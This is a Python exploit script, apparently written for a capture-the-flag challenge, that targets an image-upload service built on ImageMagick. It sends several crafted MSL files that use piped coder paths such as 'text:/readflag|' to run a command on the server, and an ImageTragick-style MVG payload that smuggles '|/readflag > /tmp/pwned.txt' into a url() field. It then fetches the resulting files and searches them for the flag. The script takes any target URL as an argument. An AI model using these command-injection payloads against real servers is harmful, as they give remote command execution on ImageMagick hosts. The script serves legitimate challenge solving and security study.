#!/usr/bin/env python3
import requests
import sys

# Target URL
URL = "http://localhost:8000" if len(sys.argv) < 2 else sys.argv[1]

def exploit():
    print(f"[*] Exploiting {URL}")

    # MSL payload to read flag
    msl_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="text:/readflag|" />
 <write filename="png:/tmp/output.png" />
</image>
'''

    # Try different approaches
    payloads = [
        # Approach 1: Execute /readflag via delegate
        ('exploit1', 'vid:msl:/tmp/exploit1*'),
        # Approach 2: Direct file read
        ('exploit2', 'inline:data.msl'),
        # Approach 3: Using ephemeral
        ('exploit3', 'ephemeral:/tmp/exploit3.msl'),
    ]

    for name, filename_prefix in payloads:
        print(f"\n[*] Trying approach: {name}")
        try:
            # Create the MSL file
            files = {
                'img': ('exploit.msl', msl_payload, 'text/plain')
            }
            data = {
                'name': name
            }

            response = requests.post(URL, files=files, data=data, timeout=5)
            print(f"[+] Upload response: {response.status_code}")

            # Try to retrieve the output
            output_url = f"{URL}/static/{name}.png"
            output_response = requests.get(output_url, timeout=5)

            if output_response.status_code == 200:
                print(f"[+] Got response from {output_url}")
                print(f"[+] Content length: {len(output_response.content)}")

                # Save the output
                with open(f"{name}_output.png", "wb") as f:
                    f.write(output_response.content)
                print(f"[+] Saved to {name}_output.png")

                # Try to extract text
                if b"ptm{" in output_response.content or b"flag" in output_response.content.lower():
                    print(f"\n[!] POSSIBLE FLAG FOUND in {name}!")
                    print(output_response.text[:500])
            else:
                print(f"[-] Output not found at {output_url}")

        except Exception as e:
            print(f"[-] Error: {e}")

    # Additional approach: ImageTragick style
    print("\n[*] Trying ImageTragick style exploit...")
    imagetragick_payload = '''push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|/readflag > /tmp/pwned.txt")'
pop graphic-context
'''

    try:
        files = {
            'img': ('exploit.mvg', imagetragick_payload, 'image/x-mgk')
        }
        data = {
            'name': 'imagetragick'
        }

        response = requests.post(URL, files=files, data=data, timeout=5)
        print(f"[+] ImageTragick upload: {response.status_code}")

    except Exception as e:
        print(f"[-] ImageTragick error: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] in ["-h", "--help"]:
        print("Usage: python exploit_magik.py [URL]")
        print("Example: python exploit_magik.py http://target:8000")
        sys.exit(0)

    exploit()
